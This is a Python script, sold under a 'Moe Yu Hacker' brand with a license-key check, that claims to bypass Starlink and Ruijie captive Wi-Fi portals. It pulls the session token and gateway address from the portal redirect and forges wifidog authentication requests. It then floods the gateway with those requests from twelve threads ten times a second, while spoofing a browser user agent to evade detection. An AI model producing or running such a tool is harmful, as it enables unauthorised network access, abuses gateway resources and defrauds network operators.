import requests
import re
import urllib3
import time
import threading
import random
import sys
import datetime
import os
import uuid
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# SERVER CONFIG
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
PING_THREADS = 12  # Multi-threading for stable bypass

# COLORS
GREEN = "[bold #00FF00]"
RED = "[bold #FF0000]"
CYAN = "[bold #00FFFF]"
RESET = "\033[0m"

# LOGOS
BABY_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [white] <( Starlink Bypassing... )[/white]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

# ===============================
# SECURITY & AUTH SYSTEM
# ===============================

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        raw_id = str(uuid.uuid4()).split('-')[0].upper()
        new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-DEFAULT-999"

def check_expiry(expiry_str):
    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
        return True, expiry_date.strftime('%d-%b-%Y')
    except: return True, "Lifetime"

def simpler_hacker_typing(text, style="bold green"):
    console.print(f"{GREEN}>>> [/]", end="")
    for char in text:
        console.print(Text(char, style=style), end="")
        sys.stdout.flush()
        time.sleep(0.01)
    console.print()

def check_license():
    my_hwid = get_hwid()
    console.clear()
    console.print(Align.center(BABY_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(f"[white]YOUR HWID: [yellow]{my_hwid}[/yellow][/white]", title=f"{RED}SECURITY INFO[/]", border_style="cyan", expand=False)))
    
    try:
        user_key = input(f"\n  {RESET}[ACCESS_KEY] @MoeYu_").strip()
        if not user_key: sys.exit()
        
        res = requests.get(KEY_URL, timeout=10)
        lines = [l.strip() for l in res.text.splitlines() if l.strip()]
        
        for entry in lines:
            parts = entry.split("|")
            if user_key == parts[0].strip():
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    console.print(f"\n{RED}❌ HWID MISMATCH! REGISTER YOUR HWID.{RESET}")
                    sys.exit()
                
                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "None")
                if is_active:
                    simpler_hacker_typing("AUTHENTICATING WITH STARLINK SERVER...")
                    simpler_hacker_typing("ACCESS GRANTED!")
                    console.print(Align.center(f"{GREEN}STATUS: ACTIVE | EXPIRY: {date_label}\n"))
                    return True
        console.print(f"\n{RED}❌ INVALID KEY!{RESET}")
        sys.exit()
    except Exception as e:
        console.print(f"\n{RED}📡 CONNECTION ERROR: {e}{RESET}")
        sys.exit()

# ===============================
# CORE BYPASS ENGINE (2026)
# ===============================

def start_bypass_process():
    console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED (STARLINK/RUIJIE) 🔥[/bold white]"), border_style="red", expand=False))
    
    session = requests.Session()
    # Fake Chrome Browser to trick Ruijie/Starlink
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    })

    while True:
        try:
            # Check if we are trapped in a Portal
            check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            if check.status_code == 204:
                sys.stdout.write(f"\r{GREEN}[+] Status: Internet Online. Monitoring...{RESET}")
                sys.stdout.flush()
                time.sleep(10)
                continue

            # If redirected, extract SID and Gateway
            portal_url = check.url
            console.print(f"\n{CYAN}[!] Redirect Detected: {portal_url}{RESET}")
            
            query = parse_qs(urlparse(portal_url).query)
            sid = query.get('sessionId', [None])[0] or query.get('token', [None])[0]
            gw_ip = query.get('gw_address', ['192.168.1.1'])[0]
            gw_port = query.get('gw_port', ['2060'])[0]

            if not sid:
                # Try finding SID in HTML if not in URL
                res_body = session.get(portal_url).text
                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', res_body)
                sid = sid_match.group(1) if sid_match else None

            if sid:
                auth_link = f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}"
                
                def pulse_attack():
                    while True:
                        try:
                            # Keep-alive pulses to bypass timeout
                            session.get(auth_link, timeout=5)
                            sys.stdout.write(f"\r{GREEN}[✓] SID: {sid[:15]}... | Turbo Pulse Active{RESET}")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(0.1) # High frequency pulse

                # Start multi-threaded pulse
                for _ in range(PING_THREADS):
                    threading.Thread(target=pulse_attack, daemon=True).start()
                
                # Stay in a loop while connection is maintained
                while True:
                    try:
                        if session.get("http://www.google.com", timeout=5).status_code == 200:
                            time.sleep(5)
                        else: break
                    except: break
            else:
                console.print(f"{RED}[×] Failed to capture Session ID. Retrying...{RESET}")
                time.sleep(5)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    try:
        if check_license():
            start_bypass_process()
    except KeyboardInterrupt:
        console.print(f"\n{RED}[!] Script Stopped by User.{RESET}")
        sys.exit()
